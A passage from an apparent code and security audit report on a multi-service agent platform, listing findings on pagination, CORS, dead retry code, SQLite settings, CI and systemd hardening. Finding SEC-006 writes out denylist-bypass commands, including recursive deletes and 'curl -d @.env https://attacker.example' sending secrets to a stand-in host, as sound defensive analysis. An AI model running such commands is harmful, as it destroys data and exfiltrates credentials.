- **Confidence:** Medium (functional impact depends on whether any workspace still has this set server-side; not independently verified from the frontend alone)

#### BE-003: `GET /api/runs` has no pagination — fully unbounded query
- **Status:** Confirmed · **Severity:** Medium · **Category:** Missing Pagination
- **Component:** `services/control-plane/app/routes/runs.py`, `run_store.list_runs()`
- **Impact:** The route accepts only an `operator_facing: bool` flag — no limit/offset/cursor. Interactive (non-employee) runs aren't subject to the retention pruning that exists for employee-tagged runs, so this payload can grow unbounded.
- **Recommended fix:** Add `limit`/`offset` (or cursor) with a sane default and hard cap, mirroring `list_workspace_tasks`'s existing 500-cap pattern.
- **Regression test:** Seed >1000 runs; assert `GET /api/runs?limit=50` returns exactly 50, and omitting `limit` still returns a bounded default.
- **Automatable:** Yes, low-risk.
- **Confidence:** High

#### BE-004: `_cors_origins()` can no longer be used to restrict allowed origins
- **Status:** Confirmed (intentional per an accompanying test, security implications unreviewed) · **Severity:** Medium · **Category:** Security-Adjacent Config Change
- **Component:** `services/control-plane/app/config.py`
- **Impact:** Setting `AXON_WATCH_CORS_ORIGINS` now only *appends* to 10 dev-loopback defaults instead of replacing them. Combined with `allow_credentials=True`, any default dev origin remains permitted to make credentialed cross-origin requests against every deployment, including production, regardless of operator configuration. Note: the separate CSRF/mutation guard (`origin_guard.py`) does not use this function, so mutating requests aren't directly widened — the exposure is credentialed GET reads via CORS.
- **Recommended fix:** Provide an explicit strict-override switch, or drop loopback defaults automatically once `is_remotely_reachable()` is true.
- **Regression test:** Assert loopback defaults are excluded under the strict mode.
- **Automatable:** Partially — needs a security-posture decision on the correct default; flagged jointly with SEC-003's owner.
- **Confidence:** Medium

#### BE-005: Stale-reconcile "verification test still running" check scans the whole host, not the specific run
- **Status:** Confirmed · **Severity:** Medium · **Category:** Overbroad Heuristic
- **Component:** `services/control-plane/app/runs/stale_reconcile.py` — `host_verification_test_active`, lines 252-274
- **Impact:** Before reaping a stale verification-shift run, the reaper checks whether *any* process anywhere on the host matches a jest/npm-test/vitest cmdline, not scoped to the run's own workspace. One unrelated healthy test process in workspace B indefinitely suppresses reaping of a genuinely hung run in workspace A.
- **Recommended fix:** Correlate the found process against the run's isolation root (e.g., compare `/proc/<pid>/cwd`) instead of a global boolean.
- **Regression test:** Two concurrent verification runs in different workspaces, one stale with no local test process, one with an active test process elsewhere — assert only the genuinely-idle one is reaped.
- **Automatable:** Partially — the cwd-correlation change is mechanical; worth a review given it touches reap logic.
- **Confidence:** High

#### SEC-006: Operator chat "run …" shell execution uses an easily-bypassed denylist instead of the sandbox used everywhere else
- **Status:** Confirmed · **Severity:** Medium · **Category:** Weak Input Validation / Inconsistent Security Model
- **Component:** `services/control-plane/app/chat/shell_command.py`
- **Impact:** `run <cmd>` chat messages execute via `subprocess.run(cmd, shell=True, ...)` with no Bubblewrap sandboxing, gated only by a denylist regex list. Trivially bypassed: `rm -rfv /path`, `rm -fr /path`, `rm --recursive --force /path`, `find . -delete`, or `curl -d @.env https://attacker.example` (no blocked characters at all) all evade it. This runs unsandboxed directly on the host filesystem, unlike the well-built agent sandbox.
- **Trigger conditions:** An operator chat message starting with `run ` — gated by normal mutating auth, so severity here is about defense-in-depth versus the platform's own stated deny-by-default design elsewhere, not an unauthenticated bypass.
- **Recommended fix:** Route this feature through the same allowlist logic used for agent terminal commands (`cli_runtime/agent_shell_hook.py`), or the bwrap sandbox.
- **Regression test:** Parametrized tests asserting `validate_shell_command_line` rejects `rm -rfv /`, `rm -fr /`, `rm --recursive --force /`, `curl -d @.env https://x` (all currently pass).
- **Automatable:** Partially — swapping to the existing allowlist function is mechanical; deserves a security review given it changes what commands operators can run.
- **Confidence:** High

#### SEC-008: Known-vulnerable transitive npm dependencies
- **Status:** Confirmed · **Severity:** Medium · **Category:** Vulnerable Dependencies
- **Component:** root `package.json`/`package-lock.json`
- **Impact:** `npm audit --omit=dev` reports 14 advisories (2 high, 12 moderate): `dompurify <=3.4.12` (moderate, multiple XSS/sanitizer-bypass CVEs, via `monaco-editor`), `nanoid <=3.3.17` (high, DoS via non-secure generator looping on bad input), `postcss <=8.5.22` (high, arbitrary `.map` file disclosure — build-tooling risk), `uuid <11.1.1` (moderate, via `expo`/`xcode` mobile build tooling).
- **Recommended fix:** `npm audit fix` for the non-breaking nanoid/postcss fixes; evaluate the `monaco-editor`/`expo` major bumps separately (breaking).
- **Regression test:** Add `npm audit --omit=dev` as a CI gate with an agreed severity threshold.
- **Automatable:** Yes for the non-breaking fixes; no for the breaking major-version bumps.
- **Confidence:** High (tool output); Medium on real-world runtime exploitability of the DOMPurify chain specifically.

#### DB-001: `services/control-plane/control-plane.sqlite3` is tracked in git; root `.gitignore` does not match it
- **Status:** Confirmed · **Severity:** Medium (no active data leak today; real structural gap) · **Category:** Repository Hygiene / Data-Leak Risk
- **Impact:** Committed as a 0-byte file (`0e72d465 "Fix OTA..."`); currently empty and not reachable by any code path found in this audit (the real default is `./.local/state/control-plane.sqlite3`, which *is* gitignored). But `.gitignore`'s `/control-plane.sqlite3` rule is root-anchored and doesn't match the nested path, so if `AXON_WATCH_CONTROL_PLANE_DB` were ever misconfigured to that relative path with `AXON_WATCH_STATE_DIR` unset, future runtime writes (chat content, run history, tokens) would land in a path `git status` would show as modified — one `git commit -a` away from committing live data.
- **Recommended fix:** `git rm --cached services/control-plane/control-plane.sqlite3` (safe, empty and unreachable); broaden `.gitignore` to `**/control-plane.sqlite3` (or a general `**/*.sqlite3` allow-list pattern).
- **Regression test:** A CI/pre-commit check failing if `git ls-files` contains any `*.sqlite3` path outside an explicit allow-list.
- **Automatable:** Yes, low-risk.
- **Confidence:** High

#### DB-004: No WAL/foreign-key/busy-timeout PRAGMAs outside the single main connection factory
- **Status:** Confirmed · **Severity:** Medium · **Category:** Concurrency / Consistency
- **Component:** `services/axon-watch/app/persistence/watch_store_sqlite.py`, `fleet_self_heal/store.py`, `platform_recovery/store.py`, `workspace_delivery/store.py`, `ci_remediation/store.py`, `services/axon-watch/app/vault/store.py`
- **Impact:** Only `run_store_sqlite.py`'s connection factory sets `busy_timeout`/`foreign_keys=ON`/`synchronous=NORMAL`/`journal_mode=WAL`. Five other SQLite-backed stores across both services use bare `sqlite3.connect(...)` with no PRAGMAs — default rollback-journal mode, `foreign_keys` off (a per-connection SQLite default), and only the driver's default busy timeout under concurrent access.
- **Recommended fix:** Factor connection setup into a shared helper, have all six connect functions call it.
- **Regression test:** Open each store's connect function; assert `PRAGMA journal_mode` returns `wal` and `PRAGMA foreign_keys` returns `1`.
- **Automatable:** Yes, low-risk.
- **Confidence:** High

#### DB-005: No DB-level `CHECK` constraints anywhere; enum-like columns validated only in Python
- **Status:** Confirmed · **Severity:** Medium (Low-Medium) · **Category:** Missing Constraint
- **Impact:** `runs.phase`/`.status`, `workspace_tasks.status`/`.risk`, `workspace_missions.status` have no DB-level guard. Validation exists in some modules (`workspace_mission_store.update_mission` raises `ValueError`) but not others — `run_store.save_run()` performs zero validation and takes a raw dict. A bug, future raw-SQL script, or ops one-off could insert an unrecognized value with nothing at the DB layer to stop it.
- **Recommended fix:** Add `CHECK (status IN (...))`/`CHECK (phase IN (...))` on `runs`, `workspace_tasks`, `workspace_missions` (Python-side frozensets already source the valid lists).
- **Regression test:** Attempt an invalid direct `INSERT`/`UPDATE`; assert rejection once constraints exist (currently succeeds silently).
- **Automatable:** Yes, low-risk.
- **Confidence:** High (absence confirmed via grep); Medium on real-world exploitability (requires a bypass path not demonstrated to exist today)

#### DB-007: `migrations/`, `db/`, `supabase/` are empty placeholders — no formal schema-versioning tool; evolution is ad hoc `ALTER TABLE` across ~15 guards
- **Status:** Confirmed · **Severity:** Medium · **Category:** Migration/Versioning Gap
- **Impact:** No `schema_version` table, no ordered migration list, no tooling anywhere. Schema evolution is entirely `CREATE TABLE IF NOT EXISTS` + `PRAGMA table_info` + `ALTER TABLE ADD COLUMN` guards, repeated independently in 15+ places — additive-only, no single place to audit expected schema state, and (per DB-002) nothing ever diffs the copies against each other.
- **Recommended fix:** Not urgent to introduce a full framework for a single-tenant local deployment, but consolidating the ad hoc guards into one ordered, version-tracked list would remove the DB-002 drift risk and give a clear upgrade story.
- **Regression test:** Run the full set of `ensure_schema`/`_ensure_*` functions against one shared temp DB in real call order; assert the resulting schema is identical regardless of which module's `connect()` touches the DB first (currently fails for `workspace_tasks`/`workspace_handoffs` per DB-002).
- **Automatable:** No — a structural refactor across many modules needs design review.
- **Confidence:** High

#### INFRA-004: No dependency/security scanning in CI
- **Status:** Confirmed · **Severity:** Medium · **Category:** CI / Supply-Chain Security
- **Impact:** Neither `fast-gate.yml` nor `nightly-verify.yml` runs any dependency vulnerability scan (npm or Python) or static security analysis. No `dependabot.yml`, no CodeQL. A vulnerable transitive dependency (see SEC-008) can merge and ship undetected by CI.
- **Recommended fix:** Add `dependabot.yml` for npm+pip; add `npm audit`/`pip-audit` (initially non-blocking) or a scheduled CodeQL workflow.
- **Automatable:** Yes, low-risk to add; blocking-threshold tuning is a judgment call.
- **Confidence:** High

#### INFRA-005: Fast-gate never boots the real services; only the once-daily nightly job exercises a live stack
- **Status:** Confirmed · **Severity:** Medium · **Category:** CI / Test Coverage Gap
- **Impact:** Bugs that only manifest with all three services actually running together (startup ordering, live SSE, the dead circuit-breaker/retry wiring, connector-probe timeout behavior) can merge on every PR and go undetected for up to ~24h. Given the working tree was observed changing branches with a large uncommitted diff mid-audit (live background-agent activity), the nightly run's daily pass/fail is highly dependent on whatever's on `dev`/`master` at cron time.
- **Recommended fix:** Add a bounded (~3 min) smoke step to fast-gate: `up.sh` + `check-health.sh` + `down.sh`.
- **Automatable:** Yes, low-risk.
- **Confidence:** Medium (coverage gap confirmed; whether it already caused a missed regression is unverified)

#### INFRA-006: System-level systemd units run as root with no hardening, unlike the parallel user units
- **Status:** Confirmed · **Severity:** Medium · **Category:** systemd / Privilege Scoping
- **Impact:** None of the three dedicated-server system unit files declare `User=`, `NoNewPrivileges=`, `ProtectSystem=`, or `MemoryMax=` — installed per the README's documented steps, they run as root with unbounded memory. The parallel desktop "always-on" user units explicitly set `MemoryHigh=`/`MemoryMax=`/`OOMPolicy=`, added after a documented ~10.5G control-plane memory spike incident — that hardening was never back-ported to the production-path units.
- **Recommended fix:** Add `User=axon-watch` (dedicated service account), `NoNewPrivileges=true`, `ProtectSystem=strict`, `ProtectHome=true`, explicit `MemoryMax=` mirroring the user-unit values.
- **Automatable:** Yes, low-risk (config-only change); document the service-account creation step.
- **Confidence:** High

#### REL-002: Circuit-breaker subsystem is fully unwired dead code — always reports healthy regardless of real provider state
- **Status:** Confirmed · **Severity:** Medium · **Category:** Self-Healing Primitives (Dead Code)
- **Component:** `services/control-plane/app/platform_recovery/circuit_breaker.py`, `states.py:90`
- **Impact:** A real three-state breaker is defined for `provider.ai`/`provider.github`/`provider.ci`/`watch`/`database`/`filesystem.worktree`/`network`, but `record_success`/`record_failure`/`allow_request` are never called anywhere in either service. Every circuit stays permanently `CLOSED`, so `/api/platform/doctor`'s "provider_availability" check can never go WARN/FAIL regardless of actual health, `allow_request()` never actually gates any outbound call, and `HALF_OPEN` is pure dead code. The frontend never reads `/api/recovery/circuits` either (zero matches for "circuit" in `apps/console-web/src`).
- **Recommended fix:** Wire `record_failure`/`record_success`/`allow_request` into real dispatch/probe/delivery call sites, including the missing time-based `OPEN → HALF_OPEN` transition — or remove the subsystem and its route/table so the doctor's "PASS" doesn't imply protection that doesn't exist.
- **Regression test:** Assert `allow_request("provider.github")` returns `False` after 3 recorded failures, and at least one real call site (e.g. the GitHub probe) calls `record_failure`/`record_success`.
- **Automatable:** No — deciding which call sites to wire (or whether to remove the subsystem) is a design decision.
- **Confidence:** High

#### REL-003: Bounded-retry "never loop forever" guard (`retry_fingerprint`/`retry_store`) is defined but never invoked
- **Status:** Confirmed · **Severity:** Medium · **Category:** Self-Healing / Retry-Loop Protection (Dead Code)
- **Impact:** `retry_fingerprint.py` implements a real escalation ladder (retry → alternate → cooldown → forced human review) keyed by a failure-class/provider/task fingerprint, but `record_retry_attempt` — the only function that persists an attempt and calls `decide_retry` — is never called anywhere else. `policy.backoff_seconds` is likewise never read by any caller. In practice, actual retry-count enforcement runs through the simpler `task_store.attempt_budget` mechanism, so this specific fingerprint-based escalation is inert rather than dangerous, but it gives false confidence that cross-failure-class escalation exists.
- **Recommended fix:** Wire `record_retry_attempt` into wherever a RETRY action is actually executed (currently no such executor exists — see REL-001's missing `/retry` endpoint), and apply `backoff_seconds` as a real delay — or delete the module and document reliance on `attempt_budget` alone.
- **Regression test:** After N recorded failures for the same fingerprint, assert a follow-up dispatch is blocked/escalated rather than retried.
- **Automatable:** No — depends on the same product decision as REL-001/REL-002.
- **Confidence:** High

#### INTEG-001: Delivery retry has no backoff delay between attempts
- **Status:** Confirmed · **Severity:** Medium · **Category:** Integration Reliability
- **Component:** `services/axon-watch/app/delivery/retry.py` — `deliver_with_retry()`, lines 28-47
- **Impact:** Retries on `HTTP 429`/`502`/`503`/`504`/connection-refused/timeout call `deliver_fn()` again immediately, with no `time.sleep`/backoff and no `Retry-After` parsing. For 429 specifically, this is close to the worst possible retry behavior and could compound load on an already-struggling receiver.
- **Recommended fix:** Add exponential backoff (e.g., `min(2**(attempt-1), 10)` seconds) between attempts, ideally parsing `Retry-After` for HTTP errors that carry it.
- **Regression test:** Mock `deliver_fn` to fail twice with "HTTP 429" then succeed; assert total elapsed wall-clock time is >0 (currently ~0).
- **Automatable:** Yes, low-risk.
- **Confidence:** High

#### BE-006: Task-lease reopen / role-scope resolution has a check-then-act race on agent terminal jobs
- **Status:** Potential Risk · **Severity:** Medium · **Category:** Race Condition
- **Component:** `services/control-plane/app/terminal/agent_job_access.py` — `_resolve_scoped_task_for_run`, lines 40-97
- **Impact:** Two near-simultaneous terminal commands on the same unscoped run can both reach the "no task_id yet" branch before either write lands, leasing two different tasks under the same lease-holder string; only one binds successfully, and the loser's `TaskLedgerError` is swallowed with a bare `except: pass`, leaving an orphaned leased task until TTL expiry.
- **Recommended fix:** Serialize task-scoping per `run_id` (in-process lock), or make lease-then-bind atomic at the DB layer.
- **Regression test:** Two threads calling the resolver concurrently for the same unscoped run should yield exactly one leased-and-bound task, no dangling lease.
- **Automatable:** Partially — locking is mechanical; the blast radius is already TTL-bounded, so this can wait for a batched fix with BE-001/BE-002.
- **Confidence:** Low-Medium (plausible from code reading; not reproduced live)

#### BE-008: Sandbox per-run scratch mount can permanently block dispatch for a workspace with a committed `.agents`/`.codex` directory
- **Status:** Potential Risk · **Severity:** Medium · **Category:** Missing Validation / Robustness
- **Component:** `services/control-plane/app/cli_runtime/agent_sandbox.py` — `_prepare_workspace_scratch`, lines 197-217
- **Impact:** Before every sandboxed dispatch, the code requires `.agents`/`.codex` to be empty-or-absent, else it raises `SandboxConfigurationError`. `.codex` is OpenAI Codex's own conventional state directory and is plausibly checked into a real repository — if so, every sandboxed dispatch against that workspace fails hard with no fallback or auto-clear.
- **Recommended fix:** Either reserve these directory names explicitly (validated at workspace provisioning with a clear error) or distinguish "our own leftover mount point" from real content via a marker file.
- **Regression test:** Seed `.codex/config.toml` before dispatch; assert either a clear, distinct error or successful dispatch (whichever is intended).
- **Automatable:** Partially — needs a product decision on intended behavior first.
- **Confidence:** Medium

#### INTEG-002: Connector health-probe timeout (750ms default) risks false "unavailable" status for legitimately slower connectors
- **Status:** Potential Risk · **Severity:** Medium · **Category:** Integration Reliability
- **Component:** `services/axon-watch/app/connectors/probe.py:42`
- **Impact:** Every connector — including ones with WAN `health_url`s — is probed with a 750ms timeout and no override or retry. TLS handshake + round-trip commonly exceeds 750ms even for a healthy remote service; a single slow-but-healthy response is immediately classified `unavailable`, feeding a false-positive outage signal into the operator-visible `required_unavailable` count.
- **Recommended fix:** Raise the default for non-loopback URLs (e.g., 3-5s), or add one retry before declaring `unavailable`, distinguishing "timed out once" from "confirmed down."
- **Regression test:** Mock server responding in ~1.2s; assert `ok`/`degraded` rather than `unavailable` under the production default.
- **Automatable:** Yes, low-risk for the timeout bump; the retry/status-distinction logic deserves a quick review.
- **Confidence:** Medium (timeout/lack-of-override confirmed by code; real-world WAN latency of currently-configured connectors not verified)

---

### LOW

#### FE-004: Dead code left behind from the axon_local connector-chip removal ("LEGACY OFFLINE"/"LEGACY DEGRADED" now unreachable)
- **Status:** Confirmed (verified unreachable via call-graph trace) · **Severity:** Low · **Category:** Dead Code
- **Component:** `apps/console-web/src/lib/ide-editor-status-view.ts:50-75`, `connector-glance-view.ts:109-126` (`buildConnectorGlanceChip` now unconditionally returns `null`)
- **Impact:** No current user-visible effect (unreachable today), but if `buildConnectorGlanceChip` is ever re-enabled for a future optional connector, the label would read "LEGACY" for something that isn't — the rest of this same in-flight diff genericized the sibling copy elsewhere, missing this one file.
- **Recommended fix:** Delete the dead glance-chip plumbing end-to-end, or finish genericizing the leftover strings.
- **Automatable:** Yes, low-risk.
- **Confidence:** High

#### BE-007: `_finalize_task` fires mission-lifecycle notification with all exceptions silently swallowed and unlogged
- **Status:** Confirmed · **Severity:** Low · **Category:** Silent Failure / Logging Gap
- **Component:** `services/control-plane/app/persistence/task_store.py` (`_finalize_task`), `workspace_missions/events.py:13-20`
- **Impact:** `notify_task_terminal` wraps mission auto-creation/kickoff in `except Exception: return` with no log statement. If mission logic breaks, the task still finalizes correctly but there is zero operational signal that downstream missions silently stopped advancing.
- **Recommended fix:** Add `logger.exception(...)` before returning.
- **Regression test:** Patch the mission call to raise; assert a log record is emitted.
- **Automatable:** Yes, low-risk.
- **Confidence:** High

#### BE-009: Task list/cancel-batch operations hard-cap at 500 with no pagination and no truncation signal
- **Status:** Confirmed · **Severity:** Low · **Category:** Pagination Correctness
- **Component:** `task_store.list_tasks` (properly clamped at 500, but no offset/cursor), `routes/tasks.py`'s `cancel_tasks_batch(scope="waiting")`
- **Impact:** A workspace with >500 tasks in one status can never retrieve the rest through the API, and a "cancel all waiting" batch action silently leaves the overflow uncancelled with a response that looks complete.
- **Recommended fix:** Add offset/cursor support; have batch-cancel loop until exhausted or explicitly report `truncated: true` with a remaining count.
- **Regression test:** Seed >500 open tasks; assert either full cancellation or a clear partial-completion signal.
- **Automatable:** Yes, low-risk.
- **Confidence:** High

#### SEC-007: Desktop bootstrap session cookie is always issued with `secure=False`
- **Status:** Confirmed · **Severity:** Low · **Category:** Insecure Cookie Configuration
- **Component:** `services/control-plane/app/routes/desktop.py:175-186`
- **Impact:** `POST /api/desktop/bootstrap` unconditionally sets `secure=False, same_site="lax"`, unlike the primary login endpoint which correctly computes `secure=_request_is_secure(request)`. Widens (modestly — `HttpOnly` still applies) the window for the cookie to be sent over a downgraded connection when reached through a TLS-terminating tunnel/proxy.
- **Recommended fix:** Use the same `secure=_request_is_secure(request)` treatment as the login endpoint.
- **Automatable:** Yes, low-risk.
- **Confidence:** High

#### SEC-009: No security response headers on either FastAPI app
- **Status:** Confirmed · **Severity:** Low/Informational (rises with SEC-003's misconfiguration risk) · **Category:** Missing Security Headers
- **Impact:** Neither app sets CSP, `X-Frame-Options`, `X-Content-Type-Options`, or HSTS. Low risk for a loopback dev tool; once remotely reachable, absence of frame-ancestors/X-Frame-Options allows the console to be framed (clickjacking against an authenticated session).
- **Recommended fix:** Add a small headers middleware setting the standard baseline set, HSTS conditional on HTTPS.
- **Automatable:** Yes, low-risk.
- **Confidence:** High

#### DB-008: `vault_secrets` has no `UNIQUE` constraint on `name`
- **Status:** Confirmed · **Severity:** Low · **Category:** Missing Constraint
- **Component:** `services/axon-watch/app/vault/store.py:16-27`
- **Impact:** Nothing at the schema level prevents duplicate secret names; depending on how the vault UI looks up secrets by name, this could surface ambiguous entries.
- **Recommended fix:** Add `UNIQUE(name)` or `UNIQUE(name, category)` if uniqueness is intended; otherwise document that duplicates are allowed.
- **Automatable:** Yes, low-risk (pending confirmation duplicates aren't intentional).
- **Confidence:** Medium (schema fact certain; end-to-end reachability of duplicates not traced)

#### INFRA-003: CI never runs on the Python version used in the Docker deployment target or the primary dev machine
- **Status:** Confirmed · **Severity:** Low · **Category:** CI / Environment Parity
- **Impact:** CI pins Python 3.12; the Docker target pins `python:3.13-slim`; local dev observed 3.14.6. A 3.13/3.14-specific stdlib behavior change could pass CI and still break the deployment target or a developer's local run.
- **Recommended fix:** Pin CI to 3.13 (matching the deployment image) or add a matrix.
- **Automatable:** Yes, low-risk.
- **Confidence:** High

#### INFRA-007: `Caddyfile.example` sets no security headers
- **Status:** Confirmed · **Severity:** Low · **Category:** Reverse Proxy Hardening
- **Impact:** The one reference config most operators will copy verbatim ships with no HSTS/`X-Content-Type-Options`/`X-Frame-Options`/`Referrer-Policy`, despite Caddy already terminating TLS.
- **Recommended fix:** Add a top-level `header {...}` block with the standard baseline.
- **Automatable:** Yes, low-risk.
- **Confidence:** High

#### INTEG-003: Webhook-style delivery adapters have no outbound authentication beyond URL secrecy
- **Status:** Confirmed (design observation) · **Severity:** Low · **Category:** Integration Reliability / Adjacent Security
- **Component:** `services/axon-watch/app/delivery/adapters/{webhook,slack,mobile_push}.py`, `http_post.py:11-36`
- **Impact:** No HMAC signature/bearer token on outbound deliveries for the generic `webhook`/`mobile_push` channels (normal for Slack's own model) — a receiving endpoint can't cryptographically confirm a POST came from this instance versus a replayed/leaked URL.
- **Recommended fix:** Add an optional signing secret env var and HMAC-SHA256 the JSON body when configured.
- **Automatable:** Yes, low-risk, opt-in.
- **Confidence:** Medium

---

### INFORMATIONAL

#### REL-004: Fleet self-heal and tunnel supervisor are well-designed with real safeguards (positive finding, no fix needed)
- **Status:** Confirmed · **Category:** Self-Healing — Positive Finding
- **Detail:** `tunnel_supervisor.py` implements real exponential backoff with jitter and a pause/resume mechanism that a deliberate operator stop actually respects. `platform_recovery/policy.py` explicitly refuses to auto-retry `UNKNOWN` failures, requires human/admin approval for auth/config/worktree/dependency failures, and gates every automatic action behind an autonomy level. `fleet_self_heal` guards against repeat-damage loops via a scan-interval gate, recency window, task-superseding on re-dispatch, an attempt budget per dispatch, and exclusion of "regressed" fingerprints from further auto-dispatch. Recorded for completeness per the audit brief's explicit self-healing checklist.

#### FE-005: `apps/console-mobile` is now a substantial Expo/React Native app — prior "not implemented" audit note is outdated
- **Status:** Confirmed (scope correction) · **Category:** Audit Scope / Stale Assumption
- **Detail:** `App.tsx` is 2,643 lines with real `expo ~57.0.15`/`react-native 0.86.2` dependencies and a `typecheck` script. The Vue `OperatorMobileShell.vue` compact shell inside `console-web` is also still actively maintained — the product currently ships two distinct mobile surfaces, worth confirming with the team whether that's intentional. `App.tsx`'s internal code quality was not reviewed line-by-line in this pass (flagged in §16).

#### SEC-010: Unsandboxed `shell=True` execution of cross-workspace mission verification commands — validation path unclear
- **Status:** Unverified / Potential Risk · **Category:** Command Injection (conditional)
- **Component:** `services/control-plane/app/workspace_missions/verification.py:17-24,126-131`
- **Detail:** `_verification_commands` reads `edge.get("verification_commands")` with no allowlist/character validation and runs it via `subprocess.run(..., shell=True)`, unlike the parallel `verification_execution.py` which strictly allowlists `npm test|npm run|npx --no-install jest|npx --no-install tsx` and rejects shell metacharacters. No public write path to `mission.impact[].verification_commands` was found within this audit's time budget (its only traced populator is the static, operator-maintained `config/workspace-dependencies.json`), so this is flagged for follow-up confirmation rather than reported as exploitable.
- **Recommended fix:** Route through the same validated allowlist as `verification_execution.py`, or confirm and assert at the point of use that this field is only ever config-file-derived.
- **Automatable:** No — needs the reachability question answered by a human first.
- **Confidence:** Low

---
